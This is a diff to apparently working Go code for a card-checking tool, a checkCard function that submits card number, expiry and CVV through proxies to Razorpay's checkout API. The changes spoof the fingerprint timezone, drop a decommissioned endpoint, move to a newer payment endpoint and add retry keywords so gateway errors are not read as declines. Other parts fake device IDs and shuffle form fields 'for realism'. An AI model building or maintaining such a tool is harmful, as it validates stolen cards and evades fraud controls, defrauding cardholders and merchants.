@@ -1753,7 +1753,7 @@ func checkCard(cc, mm, yy, cvv string, pp *parsedProxy, targetURL string, amount
 			"_[is_magic_script]":    {"false"},
 			"_[os]":                 {"windows"},
 			"_[shield][fhash]":      {fhash},
-			"_[shield][tz]":         {"0"},
+			"_[shield][tz]":         {"-330"}, // IST = UTC+5:30 (was "0"/UTC — mismatch with form7)
 			"_[device_id]":          {rzpDeviceID},
 			"_[build]":              {BUILD},
 			"_[shield][os]":         {"windows"},
@@ -1779,34 +1779,12 @@ func checkCard(cc, mm, yy, cvv string, pp *parsedProxy, targetURL string, amount
 		}
 	}
 
-	// Step 6: Cross border
-	{
-		r6Payload := map[string]interface{}{
-			"identifiers": map[string]interface{}{
-				"merchant":         map[string]string{"country": "IN"},
-				"card":             map[string]interface{}{"country": "US", "dcc_blacklist": false, "network": brand},
-				"method":           "card",
-				"payment_currency": orderCurrency,
-			},
-			"forex_charges": map[string]interface{}{
-				"amount":   orderAmount,
-				"currency": orderCurrency,
-				"filters":  map[string]string{"method": "card"},
-			},
-		}
-
-		h := stdHeaders()
-		h["Content-Type"] = "application/json"
-		r6, r6err := fetch.PostJSON(
-			fmt.Sprintf("https://api.razorpay.com/payments_cross_border_live/v1/checkout/cb_flows?x_entity_id=%s&keyless_header=%s", orderID, keylessHeaderURL),
-			h, r6Payload,
-		)
-		if r6err != nil {
-			log.Printf("step 6 (cross border): error: %v", r6err)
-		} else if r6.StatusCode >= 400 {
-			log.Printf("step 6 (cross border): HTTP %d", r6.StatusCode)
-		}
-	}
+	// Step 6: Cross border — REMOVED (2025-07-14)
+	// payments_cross_border_live/v1/checkout/cb_flows now returns 404
+	// ("no Route matched with those values") — Razorpay decommissioned this
+	// endpoint and removed it from checkout.js entirely. Calling a dead
+	// endpoint was corrupting the session state and causing payment create
+	// to return "The requested URL was not found on the server."
 
 	// Pre-payment delay: 2-4 seconds.
 	// Previously 8-15s — that caused Razorpay checkout sessions to expire
@@ -1878,7 +1856,11 @@ func checkCard(cc, mm, yy, cvv string, pp *parsedProxy, targetURL string, amount
 	// FIX 7: Shuffle form fields for realism
 	shuffledForm := shuffleFormValues(form7)
 
-	paymentURL := fmt.Sprintf("https://api.razorpay.com/v1/standard_checkout/payments/create/ajax?x_entity_id=%s&session_token=%s&keyless_header=%s", orderID, sessid, keylessHeaderURL)
+	// Endpoint updated from create/ajax → create/checkout (2025-07-14).
+	// checkout.js now exclusively uses payments/create/checkout. The old
+	// create/ajax endpoint returns "The requested URL was not found on the
+	// server." with a valid session — it has been soft-deprecated by Razorpay.
+	paymentURL := fmt.Sprintf("https://api.razorpay.com/v1/standard_checkout/payments/create/checkout?x_entity_id=%s&session_token=%s&keyless_header=%s", orderID, sessid, keylessHeaderURL)
 
 	r7, err := fetch.PostForm(paymentURL, paymentHeaders, shuffledForm)
 	if err != nil {
@@ -2266,6 +2248,12 @@ var serverErrorKeywords = []string{
 	"payment has been cancelled",
 	"payment_cancelled",
 	"has been cancelled. try again",
+	// "url not found" = Razorpay routing/session infra error, NOT a bank decline.
+	// Happens when: session expired, deprecated endpoint called, or routing table
+	// miss. Must be retried with a fresh session — not a final card decision.
+	"the requested url was not found",
+	"url_not_found",
+	"no route matched with those values",
 }
 
 // isRazorpayServerError returns true if the error description looks like a
